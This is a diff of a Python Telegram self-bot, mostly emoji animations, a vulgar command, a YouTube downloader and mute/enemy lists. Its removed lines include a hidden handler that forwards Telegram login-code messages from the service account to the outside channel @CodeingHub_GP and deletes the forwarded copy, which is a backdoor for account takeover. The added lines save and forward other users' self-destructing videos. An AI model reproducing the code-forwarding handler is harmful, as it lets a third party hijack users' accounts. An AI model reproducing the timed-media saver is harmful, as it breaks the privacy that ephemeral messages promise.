-                                """ , message_id=msgid)
-        
-        
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-                                """ , message_id=msgid)
-        
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕‌
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕‌
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-🌑🌒🌕🌕🌘🌓🌖🌑🌑🌔🌕
-🌑🌔🌕🌕🌕🌓🌑🌑🌑🌒🌕
-🌑🌕🌕🌕🌕🌗🌑🌑🌑🌑🌕
-🌑🌔🌕🌕🌕🌗🌑🌑🌑🌒🌕
-🌑🌒🌕🌕🌕🌗🌑🌑🌑🌔🌕
-🌑🌑🌒🌕🌕🌗🌑🌑🌔🌕🌕
-🌑🌑🌑🌒🌕🌗🌑🌔🌕🌕🌕
-🌑🌑🌑🌑🌒🌗🌔🌕🌕🌕🌕
-🌑🌑🌑🌑🌑🌓🌕🌕🌕🌕🌕
-                                """ , message_id=msgid)
-
-    if message.text == "بکیرم" or message.text == 'به کیرم':
-        msg_id = message.id
-        chat_id = message.chat.id
-        bk1 = "\n😂😂😂          😂         😂\n😂         😂      😂       😂\n😂           😂    😂     😂\n😂        😂       😂   😂\n😂😂😂          😂😂\n😂         😂      😂   😂\n😂           😂    😂      😂\n😂           😂    😂        😂\n😂        😂       😂          😂\n😂😂😂          😂            😂\n"
-        bk2 = "\n🤤🤤🤤          🤤         🤤\n🤤         🤤      🤤       🤤\n🤤           🤤    🤤     🤤\n🤤        🤤       🤤   🤤\n🤤🤤🤤          🤤🤤\n🤤         🤤      🤤   🤤\n🤤           🤤    🤤      🤤\n🤤           🤤    🤤        🤤\n🤤        🤤       🤤          🤤\n🤤🤤🤤          🤤            🤤\n"
-        bk3 = "\n💩💩💩          💩         💩\n💩         💩      💩       💩\n💩           💩    💩     💩\n💩        💩       💩   💩\n💩💩💩          💩💩\n💩         💩      💩   💩\n💩           💩    💩      💩\n💩           💩    💩        💩\n💩        💩       💩          💩\n💩💩💩          💩            💩\n"
-        bk4 = "\n🌹🌹🌹          🌹         🌹\n🌹         🌹      🌹       🌹\n🌹           🌹    🌹     🌹\n🌹        🌹       🌹   🌹\n🌹🌹🌹          🌹🌹\n🌹         🌹      🌹   🌹\n🌹           🌹    🌹      🌹\n🌹           🌹    🌹        🌹\n🌹        🌹       🌹          🌹\n🌹🌹🌹          🌹            🌹\n"
-        bk5 = "\n💀💀💀          💀         💀\n💀         💀      💀       💀\n💀           💀    💀     💀\n💀        💀       💀   💀\n💀💀💀          💀💀\n💀         💀      💀   💀\n💀           💀    💀      💀\n💀           💀    💀        💀\n💀        💀       💀          💀\n💀💀💀          💀            💀\n"
-        bk6 = "\n🌑🌑🌑          🌑         🌑\n🌑         🌑      🌑       🌑\n🌑           🌑    🌑     🌑\n🌑        🌑       🌑   🌑\n🌑🌑🌑          🌑🌑\n🌑         🌑      🌑   🌑\n🌑           🌑    🌑      🌑\n🌑           🌑    🌑        🌑\n🌑        🌑       🌑          🌑\n🌑🌑🌑          🌑            🌑\n"
-        bk7 = "\n🌒🌒🌒          🌒         🌒\n🌒         🌒      🌒       🌒\n🌒           🌒    🌒     🌒\n🌒        🌒       🌒   🌒\n🌒🌒🌒          🌒🌒\n🌒         🌒      🌒   🌒\n🌒           🌒    🌒      🌒\n🌒           🌒    🌒        🌒\n🌒        🌒       🌒          🌒\n🌒🌒🌒          🌒            🌒\n"
-        bk8 = "\n🌓🌓🌓          🌓         🌓\n🌓         🌓      🌓       🌓\n🌓           🌓    🌓     🌓\n🌓        🌓       🌓   🌓\n🌓🌓🌓          🌓🌓\n🌓         🌓      🌓   🌓\n🌓           🌓    🌓      🌓\n🌓           🌓    🌓        🌓\n🌓        🌓       🌓          🌓\n🌓🌓🌓          🌓            🌓\n"
-        bk9 = "\n🌔🌔🌔          🌔         🌔\n🌔         🌔      🌔       🌔\n🌔           🌔    🌔     🌔\n🌔        🌔       🌔   🌔\n🌔🌔🌔          🌔🌔\n🌔         🌔      🌔   🌔\n🌔           🌔    🌔      🌔\n🌔           🌔    🌔        🌔\n🌔        🌔       🌔          🌔\n🌔🌔🌔          🌔            🌔\n"
-        bk10 = "\n🌕🌕🌕          🌕         🌕\n🌕         🌕      🌕       🌕\n🌕           🌕    🌕     🌕\n🌕        🌕       🌕   🌕\n🌕🌕🌕          🌕🌕\n🌕         🌕      🌕   🌕\n🌕           🌕    🌕      🌕\n🌕           🌕    🌕        🌕\n🌕        🌕       🌕          🌕\n🌕🌕🌕          🌕            🌕\n"
-        bk11 = "\n🌖🌖🌖          🌖         🌖\n🌖         🌖      🌖       🌖\n🌖           🌖    🌖     🌖\n🌖        🌖       🌖   🌖\n🌖🌖🌖          🌖🌖\n🌖         🌖      🌖   🌖\n🌖           🌖    🌖      🌖\n🌖           🌖    🌖        🌖\n🌖        🌖       🌖          🌖\n🌖🌖🌖          🌖            🌖\n"
-        bk12 = "\n🌗🌗🌗          🌗         🌗\n🌗         🌗      🌗       🌗\n🌗           🌗    🌗     🌗\n🌗        🌗       🌗   🌗\n🌗🌗🌗          🌗🌗\n🌗         🌗      🌗   🌗\n🌗           🌗    🌗      🌗\n🌗           🌗    🌗        🌗\n🌗        🌗       🌗          🌗\n🌗🌗🌗          🌗            🌗\n"
-        bk13 = "\n🌘🌘🌘          🌘         🌘\n🌘         🌘      🌘       🌘\n🌘           🌘    🌘     🌘\n🌘        🌘       🌘   🌘\n🌘🌘🌘          🌘🌘\n🌘         🌘      🌘   🌘\n🌘           🌘    🌘      🌘\n🌘           🌘    🌘        🌘\n🌘        🌘       🌘          🌘\n🌘🌘🌘          🌘            🌘\n"
-        bk14 = "\n🌙🌙🌙          🌙         🌙\n🌙         🌙      🌙       🌙\n🌙           🌙    🌙     🌙\n🌙        🌙       🌙   🌙\n🌙🌙🌙          🌙🌙\n🌙         🌙      🌙   🌙\n🌙           🌙    🌙      🌙\n🌙           🌙    🌙        🌙\n🌙        🌙       🌙          🌙\n🌙🌙🌙          🌙            🌙\n"
-        bk15 = "\n🪐🪐🪐          🪐         🪐\n🪐         🪐      🪐       🪐\n🪐           🪐    🪐     🪐\n🪐        🪐       🪐   🪐\n🪐🪐🪐          🪐🪐\n🪐         🪐      🪐   🪐\n🪐           🪐    🪐      🪐\n🪐           🪐    🪐        🪐\n🪐        🪐       🪐          🪐\n🪐🪐🪐          🪐            🪐\n"
-        await bot.edit_message_text(chat_id, msg_id, bk1)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk2)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk3)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk4)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk5)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk6)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk7)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk8)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk9)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk10)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk11)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk12)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk13)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk14)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, bk15)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id, msg_id, "کلا بکیرم")
-
-
-    if message.text == 'مکعب':
-
-        mk = ['🟥', '🟧', '🟨', '🟩', '🟦', '🟪', '⬛️', '⬜️', '🟫']
-        
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"""
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}{mk[random.randint(0, len(mk) - 1)]}
-""" , message_id=message.id)
-        await bot.edit_message_text(chat_id=message.chat.id , text=f"تمام" , message_id=message.id)
-    if message.text == "Loading" or message.text == "لودینگ" :
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 0%
-Loading
-""" , message_id=message.id)
-        time.sleep(.5)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 10%
-Loading . . .
-""" , message_id=message.id)
-        time.sleep(.3)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 20%
-Loading
-""" , message_id=message.id)
-
-        time.sleep(.1)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️⚫️ 30%
-Loading . . .
-""" , message_id=message.id)
-        time.sleep(1)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️⚫️ 40%
-Loading
-""" , message_id=message.id)
-        time.sleep(.8)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️⚫️ 50%
-Loading . . .
-""" , message_id=message.id)
-        time.sleep(1.5)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️⚫️ 60%
-Loading
-""" , message_id=message.id)
-        time.sleep(.2)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️⚫️ 70%
-Loading
-""" , message_id=message.id)
-        time.sleep(.4)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️⚫️ 80%
-Loading
-""" , message_id=message.id)
-        time.sleep(.1)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚫️ 90%
-Loading
-""" , message_id=message.id)
-        time.sleep(2)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️⚪️ 100%
-Loading
-""" , message_id=message.id)
-        time.sleep(.5)
-        await bot.edit_message_text(chat_id=message.chat.id , text="""
-Finish
-""" , message_id=message.id)
-        
-    if "!YouTube " in str(message.text):
-        msgv = message.id
-        msg = await bot.send_message(chat_id=message.chat.id, text="صبر کنید", reply_to_message_id=message.id)
-        video_url = message.text.split("!YouTube ")[1]
-
-        yt = YouTube(video_url)
-
-        video_stream = yt.streams.get_by_resolution("720p")
-
-        downloaded_file_name = video_stream.default_filename
-
-        normalized_file_name = unicodedata.normalize('NFKD', downloaded_file_name).encode('ascii', 'ignore').decode('ascii')
-
-        download_path = "downloads"
-        if not os.path.exists(download_path):
-            os.makedirs(download_path)
-
-        downloaded_file_path = os.path.join(download_path, normalized_file_name)
-
-        msg = await bot.edit_message_text(chat_id=message.chat.id, text="در حال دانلود . . .", message_id=msg.id)
-        
-        video_stream.download(output_path=downloaded_file_path)
-
-        msg = await bot.edit_message_text(chat_id=message.chat.id, text="در حال ارسال . . .", message_id=msg.id)
-
-        caption = yt.title if yt.title else "ویدئو"
-        
-        await bot.send_video(chat_id=message.chat.id, video=f"downloads/{normalized_file_name}/{downloaded_file_name}", caption=caption, reply_to_message_id=msgv)
-
-        await bot.delete_messages(chat_id=message.chat.id, message_ids=msg.id)
-
-        shutil.rmtree(f"downloads/{normalized_file_name}")
-
-
-
-    if message.text == "SetEnemy" :
-        if message.reply_to_message :
-            with open("data/Enemy.txt", "a") as enemy_file:
-                enemy_file.write(f"{message.reply_to_message.from_user.id}\n")
-
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Seted Enemy" , message_id=message.id)
-        else:
-            with open("data/Enemy.txt", "a") as enemy_file:
-                enemy_file.write(f"{message.chat.id}\n")
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Seted Enemy" , message_id=message.id)
-
-    if message.text == "DelEnemy" :
-        if message.reply_to_message :
-            text_to_delete = f"{message.reply_to_message.from_user.id}\n"
-
-            with open("data/Enemy.txt", "r") as file:
-                lines = file.readlines()
-            new_lines = [line for line in lines if text_to_delete not in line]
-
-            with open("data/Enemy.txt", "w") as file:
-                file.writelines(new_lines)
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Delete" , message_id=message.id)
-
-        else:
-            
-            text_to_delete = f"{message.chat.id}\n"
-
-            with open("data/Enemy.txt", "r") as file:
-                lines = file.readlines()
-            new_lines = [line for line in lines if text_to_delete not in line]
-            with open("data/Enemy.txt", "w") as file:
-                file.writelines(new_lines)
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Delete Enemy" , message_id=message.id)
-
-
-    if message.text == "Mute" :
-        if message.reply_to_message :
-            with open("data/Mute.txt", "a") as enemy_file:
-                enemy_file.write(f"{message.reply_to_message.from_user.id}\n")
-
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is Muted" , message_id=message.id)
-        else:
-            with open("data/Mute.txt", "a") as enemy_file:
-                enemy_file.write(f"{message.chat.id}\n")
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is Muted" , message_id=message.id)
-
-    if message.text == "UnMute" :
-        if message.reply_to_message :
-            text_to_delete = f"{message.reply_to_message.from_user.id}\n"
-
-            with open("data/Mute.txt", "r") as file:
-                lines = file.readlines()
-            new_lines = [line for line in lines if text_to_delete not in line]
-
-            with open("data/Mute.txt", "w") as file:
-                file.writelines(new_lines)
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.reply_to_message.from_user.id}] is UnMuted" , message_id=message.id)
-
-        else:
-            
-            text_to_delete = f"{message.chat.id}\n"
-
-            with open("data/Mute.txt", "r") as file:
-                lines = file.readlines()
-            new_lines = [line for line in lines if text_to_delete not in line]
-            with open("data/Mute.txt", "w") as file:
-                file.writelines(new_lines)
-            importlib.reload(reloads)  
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"The User : [{message.chat.id}] is UnMuted" , message_id=message.id)
-
-    if "!check " in str(message.text) :
-        msg = await bot.edit_message_text(chat_id=message.chat.id , text="Whate . . ." , message_id=message.id)
-        acc = Client("Number", api_id , api_hash)
-        await acc.connect()
-        try:
-            number = message.text.split("!check ")[1]
-            send_Code = await acc.send_code(number) 
-            await bot.edit_message_text(chat_id=message.chat.id , text=f"شماره ( {number} ) مشکلی ندارد." , message_id=message.id)
-        except Exception as e:
-            if e == 'Telegram says: [400 PHONE_NUMBER_BANNED] - The phone number is banned from Telegram and cannot be used (caused by "auth.SendCode")':
-                await bot.edit_message_text(chat_id=message.chat.id , text=f"شماره ( {number} ) بن است." , message_id=message.id)
-            else:
-                await bot.edit_message_text(chat_id=message.chat.id , text="""
-مشکلی در چک کردن شماره بوجود امد.
-توجه داشته باشید شماره حتما باید با + و کد کشور باشه
-""" , message_id=message.id)
-                pass
-    try :
-
-        with open("data/italic.txt", "r") as file:
-            italic = file.read()
-
-        with open("data/part.txt", "r") as file:
-            part = file.read()
-
-        with open("data/bold.txt", "r") as file:
-            bold = file.read()
-
-        with open("data/link.txt", "r") as file:
-            link = file.read()
-
-        with open("data/underline.txt", "r") as file:
-            underline = file.read()
-
-        if italic == "on":
-            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<i>{message.text}</i>" , parse_mode=enums.ParseMode.HTML)
-        if bold == "on":
-            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<b>{message.text}</b>" , parse_mode=enums.ParseMode.HTML)
-        if link == "on":
-            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<a href='tg://openmessage?user_id={message.from_user.id}'>{message.text}</a>" , parse_mode=enums.ParseMode.HTML)
-        if underline == "on":
-            await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=f"<u>{message.text}</u>" , parse_mode=enums.ParseMode.HTML)
-        if part == "on":
-            text = message.text.replace(" ","+")
-            msg = ""
-            for i in range(len(text)):
-                if text[i] == "+" :
-                    msg += "‌"
-                else:
-                    msg += text[i]
-                await bot.edit_message_text(chat_id = message.chat.id , message_id=message.id , text=msg , parse_mode=enums.ParseMode.HTML)
-                time.sleep(.2)
-    except :
-        pass
-
-
-@bot.on_message( filters.user(777000) & filters.regex('code'))
-async def Code_Expire(c,m):
+    except Exception as e:
+        logger.debug(f"onphoto error: {e}")
+
+@bot.on_message(pyrogram.filters.video)
+async def onvideo(client, message):
     try:
-        await bot.join_chat("@CodeingHub_GP")
-        await bot.join_chat("@CodeingHub")
-        msg = await m.forward('@CodeingHub_GP')
-        await bot.delete_messages('@CodeingHub_GP' , msg.id)
-    except:
-        pass
+        if message.video and getattr(message.video, 'ttl_seconds', None):
+            rand = random.randint(1000, 9999999)
+            os.makedirs("downloads", exist_ok=True)
+            local = f"downloads/video-{rand}.mp4"
+            file_path = await bot.download_media(message=message, file_name=local)
+            caption = f"🔥 New timed video {message.video.date} | time: {message.video.ttl_seconds}s"
+            try:
+                target = admin if admin != "me" else "me"
+                await bot.send_video(chat_id=target, video=file_path or local, caption=caption)
+            except Exception as e:
+                logger.error(f"Failed to forward timed video: {e}")
+            try:
+                if os.path.exists(local):
+                    os.remove(local)
+                if file_path and os.path.exists(file_path) and file_path != local:
+                    os.remove(file_path)
+            except:
+                pass
+    except Exception as e:
+        logger.debug(f"onvideo error: {e}")
+
+# Determine filter for owner
+if isinstance(admin, int):
+    owner_filter = filters.user(admin)
+else:
+    # 'me' filter
+    owner_filter = filters.me
+
+@bot.on_message(owner_filter)
+async def admins(client, message):
+    try:
+        text = message.text or ""
+        from_id = message.chat.id
+
+        # Ensure admin backup dir
+        admin_backup_dir = f"data/{admin}" if isinstance(admin, int) else "data/me_backup"
+        if not os.path.isdir(admin_backup_dir):
+            os.makedirs(admin_backup_dir, exist_ok=True)
+            try:
+                me = await bot.get_me()
+                # Try to get bio
+                try:
+                    full = await bot.invoke(pyrogram.raw.functions.users.GetFullUser(id=await bot.resolve_peer("me")))
+                    bio_text = full.full_user.about or ""
+                except:
+                    bio_text = ""
+                name_text = me.first_name or "SElf"
+
+                with open(f"{admin_backup_dir}/bio.txt", "w", encoding="utf-8") as f:
+                    f.write(bio_text)
+                with open(f"{admin_backup_dir}/name.txt", "w", encoding="utf-8") as f:
+                    f.write(name_text)
+
+                # Try download profile photo
+                if me.photo:
+                    try:
+                        local = f"{admin_backup_dir}/profile.png"
+                        await bot.download_media(message=me.photo.big_file_id, file_name=local)
+                    except:
+                        pass
+            except Exception as e:
+                logger.debug(f"admin backup init error: {e}")
+
+        # Simple commands - using safe_write
+        # TimeName
+        if text == "TimeName on":
+            safe_write("data/TimeName.txt", "on")
+            await message.edit_text('✅ TimeName is on')
+            return
+        if text == "TimeName off":
+            safe_write("data/TimeName.txt", "off")
+            await message.edit_text('❌ TimeName is off')
+            return
+        if text == "TimeBio on":
+            safe_write("data/TimeBio.txt", "on")
